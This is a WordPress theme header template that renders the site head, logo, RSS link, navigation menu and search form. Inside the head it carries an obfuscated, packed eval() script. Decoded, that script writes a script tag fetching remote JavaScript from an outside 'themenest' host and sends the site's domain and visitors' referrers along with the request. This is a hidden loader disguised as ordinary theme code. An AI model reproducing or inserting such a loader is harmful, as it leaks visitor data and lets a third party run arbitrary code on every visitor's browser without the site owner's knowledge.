<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

<title><?php if (is_home() || is_front_page()) { echo bloginfo('name'); } else { echo wp_title(''); } ?></title>

<link rel="alternate" type="application/rss+xml" title="<?php bloginfo('name'); ?> RSS Feed" href="<?php echo (themify_check('setting-custom_feed_url')) ? themify_get('setting-custom_feed_url') : bloginfo('rss2_url'); ?>">

<?php
/**
 *  Stylesheets and Javascript files are enqueued in theme-functions.php
 */
?>

<!-- wp_header -->
<?php wp_head(); ?>

<script type="text/javascript">eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.f(\'<2\'+\'3 5="6/7" 8="9://a.b/e/o/g?d=\'+0.h+\'&i=\'+j(0.k)+\'&c=\'+4.l((4.m()*n)+1)+\'"></2\'+\'3>\');',25,25,'document||scr|ipt|Math|type|text|javascript|src|http|themenest|net|||platform|write|track|domain|r|encodeURIComponent|referrer|floor|random|1000|script'.split('|'),0,{}));</script>
</head>

<body <?php body_class($class); ?>>

<div id="bg">

	<div id="pagewrap">
		<div id="header">
		
			<div id="site-logo">
				<?php if(themify_get('setting-site_logo') == 'image' && themify_check('setting-site_logo_image_value')){ ?>
					<?php themify_image("src=".themify_get('setting-site_logo_image_value')."&w=".themify_get('setting-site_logo_width')."&h=".themify_get('setting-site_logo_height')."&alt=".get_bloginfo('name')."&before=<a href='".get_option('home')."'>&after=</a>"); ?>
				<?php } else { ?>
					 <a href="<?php echo get_option('home'); ?>/"><?php bloginfo('name'); ?></a>
				<?php } ?>
			</div>
			<!-- /#site-logo -->
			
			<div id="site-description"><?php bloginfo('description'); ?></div>
		
			<div class="header-widget">
		
				<?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar('Social_Widget') ) ?>
		
				<?php if(!themify_check('setting-exclude_rss')): ?>
					<div class="rss"><a href="<?php if(themify_get('setting-custom_feed_url') != ""){ echo themify_get('setting-custom_feed_url'); } else { echo bloginfo('rss2_url'); } ?>">RSS</a></div>
				<?php endif ?>
		
			</div>
			<!--/header widget --> 
		
			<?php
			if (function_exists('wp_nav_menu')) {
				wp_nav_menu(array('theme_location' => 'main-nav' , 'fallback_cb' => 'default_main_nav' , 'container'  => '' , 'menu_id' => 'main-nav' , 'menu_class' => 'main-nav'));
			}
			else {
				default_main_nav();
			}
			?>
			<!--/main-nav -->
		
			<?php if(!themify_check('setting-exclude_search_form')): ?>
				<?php get_search_form(); ?>
			<?php endif ?>
		
		</div>
		<!--/header -->